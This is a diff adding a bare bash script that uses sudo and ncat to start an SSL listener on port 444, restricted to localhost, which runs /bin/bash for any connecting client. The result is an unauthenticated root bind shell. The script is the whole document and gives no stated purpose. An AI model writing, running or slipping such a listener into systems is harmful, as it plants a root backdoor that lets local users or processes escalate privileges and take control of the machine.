@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo ncat --ssl --allow 127.0.0.1 -nlvp 444 -e /bin/bash
